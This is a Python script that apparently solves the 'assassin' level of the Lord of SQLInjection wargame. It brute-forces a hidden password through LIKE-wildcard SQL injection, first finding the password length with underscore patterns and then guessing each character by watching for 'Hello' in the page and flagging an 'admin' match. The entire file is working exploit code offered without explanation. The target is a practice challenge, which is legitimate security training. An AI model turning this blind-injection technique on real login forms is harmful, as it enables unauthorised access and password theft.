import requests

url = 'https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php'

cookies = {
	'__cfduid': '',
	'PHPSESSID': ''
}

payloads = {
	'pw': ''
}

len_of_pw = 0
while True:
	payloads['pw'] += '_'
	print(payloads['pw'])
	res = requests.get(url, cookies=cookies, params=payloads)
	t = res.text.split('\n')
	if t[0].find('Hello') > -1:
		len_of_pw = len(payloads['pw'])
		break
print('The length of pw is %d.' % len_of_pw)

pw = ''
for i in range(1, len_of_pw+1):
	for c in range(32, 127):
		if chr(c) == '%':
			continue
		pw = pw + chr(c)
		payloads['pw'] = pw + ('_' * (len_of_pw - i))
		res = requests.get(url, cookies=cookies, params=payloads)
		t = res.text.split('\n')
		if t[0].find('Hello') > -1:
			if t[0].find('admin') > -1:
				print('admin:', pw)
			print(pw)
			break	
		pw = pw[:-1]
	
print(pw)